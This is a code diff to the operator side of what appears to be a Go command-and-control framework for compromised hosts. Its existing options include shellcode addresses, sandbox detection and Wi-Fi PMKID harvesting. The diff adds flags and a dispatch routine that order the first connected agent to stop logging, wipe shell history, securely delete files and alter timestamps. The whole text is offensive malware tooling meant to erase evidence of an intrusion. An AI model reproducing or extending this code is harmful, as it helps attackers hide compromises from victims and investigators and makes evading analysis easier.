@@ -176,6 +176,9 @@ func main() {
 	scWinExec := flag.Uint64("shellcode-winexec", 0, "windows_x64 WinExec address (from PEB walk)")
 	hostInfo := flag.Bool("hostinfo", false, "ask the first agent for its local interface picture")
 	vmDetect := flag.Bool("vmdetect", false, "ask the first agent to run VM/sandbox detection")
+	antiForen := flag.String("antiforen", "", "anti-forensics: logstop|history|secure_delete|timestamp|all")
+	antiForenPaths := flag.String("antiforen-paths", "", "comma-separated paths (secure_delete / timestamp / all)")
+	antiForenDry := flag.Bool("antiforen-dry", false, "print actions without executing")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -582,6 +585,24 @@ func main() {
 	// vmdetect dispatch — one-shot VM/sandbox check on the first agent
 	if *vmDetect {
 		go runVMDetectDispatch(mgr)
+	}
+
+	// antiforen dispatch — anti-forensics primitives on the first agent
+	if *antiForen != "" {
+		var paths []string
+		if *antiForenPaths != "" {
+			for _, p := range strings.Split(*antiForenPaths, ",") {
+				p = strings.TrimSpace(p)
+				if p != "" {
+					paths = append(paths, p)
+				}
+			}
+		}
+		go runAntiForenDispatch(mgr, antiForenArgs{
+			Action: *antiForen,
+			Paths:  paths,
+			DryRun: *antiForenDry,
+		})
 	}
 
 	if *dnsBind != "" {
@@ -1502,5 +1523,31 @@ func runVMDetectDispatch(mgr *session.Manager) {
 	log.Printf("[vmdetect] -> %s", s.AgentID)
 	if err := s.SendVMDetectStart(sessionID, proto.VMDetectStart{SessionID: sessionID}); err != nil {
 		log.Printf("[vmdetect] start: %v", err)
+	}
+}
+
+// antiForenArgs carries the operator's -antiforen* flags.
+type antiForenArgs struct {
+	Action string
+	Paths  []string
+	DryRun bool
+}
+
+// runAntiForenDispatch waits for the first agent, sends an AntiForenStart.
+func runAntiForenDispatch(mgr *session.Manager, a antiForenArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("af-%d", time.Now().UnixNano())
+	log.Printf("[antiforen] %s dry=%v -> %s", a.Action, a.DryRun, s.AgentID)
+	req := proto.AntiForenStart{
+		SessionID: sessionID,
+		Action:    a.Action,
+		Paths:     a.Paths,
+		DryRun:    a.DryRun,
+	}
+	if err := s.SendAntiForenStart(sessionID, req); err != nil {
+		log.Printf("[antiforen] start: %v", err)
 	}
 }
